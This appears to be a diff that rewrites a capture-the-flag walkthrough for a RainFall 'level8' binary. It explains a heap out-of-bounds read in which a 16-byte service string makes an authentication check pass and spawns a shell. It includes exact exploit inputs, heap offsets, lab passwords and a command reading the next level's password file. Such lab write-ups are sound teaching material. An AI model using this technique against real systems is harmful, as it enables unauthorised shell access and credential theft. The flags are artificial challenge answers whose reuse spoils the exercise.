@@ -1,102 +1,56 @@
-# Level8 Walkthrough
+1. Download the binary from the server:
+   scp -P 2222 level8@localhost:~/level8 .
+   Password: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 
-## Step 1: Download the Binary
+2. Analyze the binary with Ghidra:
+   - Command-line interface with 4 commands: auth, reset, service, login
+   - auth command: malloc(4) - allocates only 4 bytes on heap
+   - service command: strdup(arg) - allocates string on heap
+   - login command: checks *(int *)(auth + 32) - out-of-bounds read!
+   - If (auth + 32) is non-zero, spawns shell via system("/bin/sh")
+   - Global variables: auth at 0x08049aac, service at 0x08049ab0
 
-From your local machine:
+3. Verify heap layout by running the program:
+   ./level8
+   
+   Type: auth AAAA
+   Output: 0x804a008, (nil)  ← auth allocated at 0x804a008
+   
+   Type: service BBBBBBBBBBBBBBBB
+   Output: 0x804a008, 0x804a018  ← service allocated at 0x804a018
+   
+   Distance: 0x804a018 - 0x804a008 = 16 bytes (0x10)
 
-```bash
-scp -P 2222 level8@localhost:~/level8 .
-# Password: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
-```
+4. Calculate the exploit:
+   Goal: Make (auth + 32) read non-zero data
+   
+   auth points to: 0x804a008
+   auth + 32 is:   0x804a008 + 0x20 = 0x804a028
+   
+   service points to: 0x804a018
+   auth + 32 offset into service: 0x804a028 - 0x804a018 = 16 bytes
+   
+   Conclusion: If service is ≥16 bytes long, (auth + 32) will read 
+   into service buffer and find non-zero data!
 
-## Step 2: Analyze with Ghidra
+5. Connect to the VM via SSH:
+   ssh level8@localhost -p 2222
+   Password: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 
-Load the binary in Ghidra and examine the `main` function.
+6. Execute the exploit:
+   ./level8
+   
+   Enter these commands:
+   auth AAAA
+   service BBBBBBBBBBBBBBBB
+   login
+   
+   Shell spawned!
 
-### Key Findings:
+7. Get the flag:
+   cat /home/user/level9/.pass
+   
+   Password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
 
-1. **Command-line Interface**: The program implements a simple CLI with commands:
-   - `auth <arg>` - Allocates 4 bytes for authentication data
-   - `reset` - Frees the auth pointer
-   - `service <arg>` - Duplicates a service string using `strdup()`
-   - `login` - Checks authentication status
-
-2. **The Vulnerability**:
-```c
-if (*(int *)(auth + 32) == 0) {
-    fwrite("Password:\n", 1, 10, stdout);
-}
-else {
-    system("/bin/sh");
-}
-```
-
-The login command checks 32 bytes (`0x20`) past the `auth` pointer, but `auth` is only allocated 4 bytes via `malloc(4)`.
-
-3. **Global Variables**:
-   - `auth` at `0x08049aac`
-   - `service` at `0x08049ab0`
-
-4. **Heap Layout**:
-   - When `auth` is allocated, it gets a heap address (e.g., `0x804a008`)
-   - When `service` is allocated next, it gets the adjacent chunk (e.g., `0x804a018`)
-   - The offset is exactly 16 bytes (`0x10`)
-
-## Step 3: Understanding the Exploit
-
-When we allocate both `auth` and `service`:
-- `auth` points to `0x804a008`
-- `service` points to `0x804a018` (16 bytes later)
-
-The login check reads at `auth + 32`:
-- `0x804a008 + 0x20 = 0x804a028`
-
-This address falls inside the `service` buffer:
-- `0x804a028 - 0x804a018 = 0x10 = 16 bytes into service`
-
-So if `service` contains at least 16 bytes of data, the check will read non-zero values and grant shell access!
-
-## Step 4: Connect to the VM
-
-```bash
-ssh level8@localhost -p 2222
-# Password: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
-```
-
-## Step 5: Execute the Exploit
-
-Run the binary and enter these commands:
-
-```bash
-level8@RainFall:~$ ./level8
-(nil), (nil)
-auth AAAA
-0x804a008, (nil)
-service BBBBBBBBBBBBBBBB
-0x804a008, 0x804a018
-login
-$ cat /home/user/level9/.pass
-c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
-```
-
-## Step 6: Explanation
-
-1. `auth AAAA` allocates a 4-byte chunk on the heap at `0x804a008`
-2. `service BBBBBBBBBBBBBBBB` allocates a string on the heap at `0x804a018` (16 bytes after auth)
-3. `login` checks `auth + 32` = `0x804a028`, which is 16 bytes into the service buffer
-4. Since service contains non-zero data (the B's), the check passes
-5. Shell spawned!
-
-## Step 7: Get the Flag
-
-```bash
-$ cat /home/user/level9/.pass
-c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
-```
-
-## Step 8: Login as level9
-
-```bash
-su level9
-# Password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
-```
+8. Exit and login as level9:
+   su level9
